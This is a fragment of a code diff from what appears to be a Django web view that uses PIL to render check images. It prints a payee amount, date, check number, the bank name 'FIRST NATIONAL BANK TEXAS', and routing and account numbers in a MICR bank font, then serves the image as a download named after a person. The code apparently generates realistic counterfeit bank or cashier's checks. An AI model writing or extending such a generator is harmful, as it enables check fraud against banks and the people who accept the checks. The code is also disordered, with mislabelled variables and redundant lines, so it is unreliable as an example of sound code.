+        draw.text((x,y), amount_in_words.upper(), fill=color, font=date_font)
+        (x, y) = (1550, 310)
+        check_amount = '$483.40'
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), check_amount, fill=color, font=date_font)
+
+
+
+
+
+
+
+    date_font = ImageFont.truetype("./arial.ttf", size=40)
+    (x, y) = (1350, 150)
+    date = date_formated
+    date_font = ImageFont.truetype("./arial.ttf", size=30)
+
+    draw.text((x,y), date_formated, fill=color, font=date_font)
+
+
+
+    (x, y) = (1350, 100)
+    checkno = str(business_check_number)
+    checkno = checkno.strip('0')
+    date_font = ImageFont.truetype("./arial.ttf", size=35)
+
+    draw.text((x,y), checkno, fill=color, font=date_font)
+
+    (x, y) = (1050, 1120)
+    checkno = str(business_check_number)
+    date_font = ImageFont.truetype("./arial.ttf", size=40)
+
+    draw.text((x,y), '***FIRST NATIONAL BANK TEXAS***', fill=color, font=date_font)
+
+
+
+    (x, y) = (1000, 710)
+    checkno = str(business_account_number) + 'c'
+    date_font = ImageFont.truetype("./micrenc.ttf", size=55)
+
+    draw.text((x,y), checkno, fill=color, font=date_font)
+
+
+
+
+    checkmrifont= ImageFont.truetype("./micrenc.ttf", size=55)
+
+
+
+    #(x, y) = (900, 700)
+    #check_mri = 'a'+str(cashier2022_check_print_number) 
+
+    #draw.text((x,y), check_mri, fill=(0,0,0), font=checkmrifont)
+
+    checkmrifont= ImageFont.truetype("./micrenc.ttf", size=55)
+
+    (x, y) = (660, 710)
+    account_number = 'a' + str(business_routing_number) + 'a'
+
+    draw.text((x,y), account_number, fill=(0,0,0), font=checkmrifont)
+
+
+    checkmrifont= ImageFont.truetype("./micrenc.ttf", size=55)
+
+    (x, y) = (300, 710)
+    routing_number = 'c'+ str(business_check_number) + 'c' 
+
+    draw.text((x,y), routing_number, fill=(0,0,0), font=checkmrifont)
+    width, height = 400, 400
+    image = Image.new("RGB", (width, height), "black")
+
+    # Create a drawing object
+    draw = ImageDraw.Draw(image_1)
+
+    # Specify the line coordinates (x1, y1, x2, y2) and color (RGB)
+    x1, y1, x2, y2 = 1050, 70, 1150, 70
+    line_color = (0, 0, 0)  # Red color
+
+    if small_text_2:
+        draw.line([(x1, y1), (x2, y2)], fill=line_color, width=2)
+
+    image_1.save('cashier2022' + '.png')
+
+    file = open('cashier2022' +'.png', 'rb').read()
+    rea_response = HttpResponse(file, content_type='image/png')
+    rea_response['Content-Disposition'] = 'attachment;filename={}'.format(full_name+'.png')
+
+    return rea_response
+
+
 
